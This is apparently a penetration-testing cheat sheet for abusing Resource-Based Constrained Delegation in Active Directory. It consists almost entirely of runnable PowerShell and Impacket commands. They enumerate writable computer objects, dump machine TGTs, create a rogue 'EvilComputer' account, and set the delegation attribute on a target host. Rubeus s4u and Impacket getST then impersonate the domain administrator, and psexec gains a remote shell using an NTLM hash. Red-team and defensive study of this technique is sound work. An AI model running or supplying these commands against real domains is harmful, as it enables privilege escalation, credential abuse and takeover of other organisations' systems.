# Resource-Based Constrained Delegation

## Abuse

### Check for Computer Objects we have WriteAccess to
```powershell
# Powerview
$Identity = "PROD\Dave" ; Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs -ErrorAction "SilentlyContinue"  | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.Identity -eq "$Identity" -and ($_.ActiveDirectoryRights -like "*GenericAll*" -or $_.ActiveDirectoryRights -like "*GenericWrite*" -or $_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*AddAllowedToAct*" -or $_.ActiveDirectoryRights -like "*SyncLAPSPassword*" -or $_.ActiveDirectoryRights -like "*WriteAccountRestrictions*" -or $_.ActiveDirectoryRights -like "*WriteSPN*" -or $_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*WriteOwner*" -or $_.ActiveDirectoryRights -like "*AllExtendedRights*" -or $_.ActiveDirectoryRights -like "*ExtendedRight*") }
```
```powershell
# ADSI Native
$Identity = "PROD\Dave"
$UserSID = (New-Object System.Security.Principal.NTAccount($Identity)).Translate([System.Security.Principal.SecurityIdentifier])

$PermissionsToCheck = @(
    "GenericAll",
    "GenericWrite",
    "WriteProperty",
    "AddAllowedToAct",
    "SyncLAPSPassword",
    "WriteAccountRestrictions",
    "WriteSPN",
    "WriteDACL",
    "WriteOwner",
    "AllExtendedRights",
    "ExtendedRight"
)

$DomainDN = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetDirectoryEntry().distinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$DomainDN")
$Searcher.Filter = "(&(objectCategory=computer))"
$Searcher.PageSize = 1000
$Searcher.PropertiesToLoad.Add("distinguishedName")
$Computers = $Searcher.FindAll()

foreach ($Computer in $Computers) {
    $ComputerDN = $Computer.Properties["distinguishedName"][0]
    $ComputerEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$ComputerDN")
    try {
        $ComputerEntry.RefreshCache("ntSecurityDescriptor")
        $SecurityDescriptor = $ComputerEntry.ObjectSecurity
        $ACL = $SecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
        foreach ($Ace in $ACL) {
            if ($Ace.IdentityReference -eq $UserSID) {
                foreach ($Permission in $PermissionsToCheck) {
                    if ($Ace.ActiveDirectoryRights.ToString().Contains($Permission)) {
                        [PSCustomObject]@{
                            Computer              = $ComputerDN
                            Identity              = $Identity
                            ActiveDirectoryRights = $Ace.ActiveDirectoryRights
                            InheritanceType       = $Ace.InheritanceType
                            ObjectType            = $Ace.ObjectType
                            IsInherited           = $Ace.IsInherited
                        }
                        break
                    }
                }
            }
        }
    } catch {
        continue
    }
}
```
## Obtain Machine Account TGT
### Option 1: Local Admin or have admin on remote system
If we have local admin or admin on a remote system, we can dump the systems TGT to be used in a later stage of the attack.
```powershell
# Dump system TGT
Invoke-Rubeus -Command "dump /service:krbtgt /user:WS01$ /nowrap"
```

### Option 2: Create New Machine Account
If we do not have local admin or remote admin on a remote system, we can instead create a new machine in the domain providing `ms-Ds-MachineAccountQuota` is greater than 0.
```powershell
# Verify if ms-Ds-MachineAccountQuota is greater than 0
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota

# Create new machine account with Powermad.ps1
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

## Convert to raw bytes using the machine account SID
```powershell
# Change line below 
$ComputerSID = Get-DomainComputer -Identity EvilComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSID))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Change line below
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Change Line Below
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
ConvertFrom-SID ($Descriptor.DiscretionaryAcl).SecurityIdentifier.value
```
## Request ticket
```powershell
# Request with TGT
Invoke-Rubeus -Command "s4u /user:EvilComputer$ /ticket:[Base64 Ticket] /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt"

# Request with Hash or Password
Invoke-Rubeus -Command "s4u /user:EvilComputer$ /rc4:[RC4 Hash] /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt"
Invoke-Rubeus -Command "s4u /user:EvilComputer$ /aes256:[AES256 Hash] /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt"

# Request hash with machine account password to be used with above commands
Invoke-Rubeus -Command "hash /username:EvilComputer$ /domain:corp1.com /password:Password123!"
```

# Impacket
This attack can also be performed with Linux using Impacket.
```bash
impacket-addcomputer -computer-name 'EvilComputer$' -computer-pass 'Password123!' corp.com/robert -hashes ":46DC89CC8572A5CAD1687C9297633066" -dc-ip 192.168.236.100
impacket-rbcd -action write -delegate-to "Files02$" -delegate-from 'EvilComputer$' corp.com/robert -hashes ":46DC89CC8572A5CAD1687C9297633066" -dc-ip 192.168.236.100
impacket-getST -spn cifs/files02.corp.com -impersonate administrator 'corp.com/EvilComputer$:Password123!' -dc-ip 192.168.236.100
export KRB5CCNAME=administrator@cifs_files02.corp.com@CORP.COM.ccache 
impacket-psexec administrator@files02.corp.com -k -no-pass -dc-ip 192.168.236.100
```

